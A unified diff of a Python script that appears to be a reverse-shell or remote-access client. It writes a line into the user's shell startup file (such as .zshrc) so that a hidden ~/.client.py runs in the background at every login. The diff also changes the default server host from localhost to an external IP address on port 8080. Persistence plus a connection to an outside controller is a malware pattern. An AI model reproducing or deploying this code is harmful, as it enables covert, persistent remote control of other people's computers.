@@ -1,7 +1,7 @@
 import socket, subprocess, os, sys
-from time import sleep, time
+from time import sleep
 '''
-First, make this script start every time the user starts their computer, or a new shell.
+First, make this script start every time the user starts their computer, or a new shell. (If they are running linux)
 '''
 #If they use zshrc, set that to the rcFile to edit
 if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
@@ -28,7 +28,7 @@ if MAKE_PERSISTENT and not NO_PERSISTENCE:
         file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
 
 
-SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
+SERVER_HOST = "129.21.84.60" #DEFAULT SERVER HOST
 SERVER_PORT = 8080 #DEFAULT SERVER PORT
 BUFFER_SIZE = 1024 * 128 #128KB max size
 
